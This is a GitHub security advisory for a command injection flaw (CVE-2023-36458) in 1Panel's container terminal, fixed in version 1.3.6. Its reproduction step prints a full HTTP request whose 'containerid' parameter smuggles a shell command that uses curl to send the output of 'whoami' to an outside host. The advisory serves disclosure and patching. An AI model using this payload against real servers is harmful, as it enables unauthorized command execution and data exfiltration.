# [M] 1Panel vulnerable to command injection when entering the container terminal

## Summary
Severity: Medium
Advisory: GHSA-7x2c-fgx6-xf9h
CVE: CVE-2023-36458
CWE: CWE-77
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2023-07-05
Source: https://github.com/advisories/GHSA-7x2c-fgx6-xf9h
Type: github-advisory

## Affected
- Go: `github.com/1Panel-dev/1Panel` — affected >=0 <1.3.6

## Details
### Impact

The authenticated attacker can craft a malicious payloads to achieve command injection when entering the container terminal.

1. Vulnerability analysis.

```
backend\app\api\v1\terminal.go#ContainerWsSsh
```
![image](https://user-images.githubusercontent.com/46734380/249119420-045ec192-250d-4d07-a69e-0bd794cddec7.png)

2. vulnerability reproduction.

```
GET /api/v1/containers/exec?cols=80&rows=24&containerid=/bin/bash||curl%20http://192.168.109.1:12345/`whoami`||&user=asd&command=/bin/bash HTTP/1.1
Host: 192.168.109.152:40982
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Sec-WebSocket-Version: 13
Origin: http://192.168.109.152:40982
Sec-WebSocket-Key: cOEWTRgkjxVppuhzAfOUWQ==
Connection: keep-alive, Upgrade
Cookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
```

3. The successful execution of system commands.
![image](https://user-images.githubusercontent.com/46734380/249119520-ed2dcc32-be4a-45d8-9286-f9fb778e87da.png)

Affected versions: <= 1.3.5

### Patches

The vulnerability has been fixed in v1.3.6.

### Workarounds

It is recommended to upgrade the version to v1.3.6.

### References

If you have any questions or comments about this advisory:

Open an issue in https://github.com/1Panel-dev/1Panel
Email us at wanghe@fit2cloud.com

## References
- https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-7x2c-fgx6-xf9h
- https://nvd.nist.gov/vuln/detail/CVE-2023-36458
- https://github.com/1Panel-dev/1Panel
- https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6
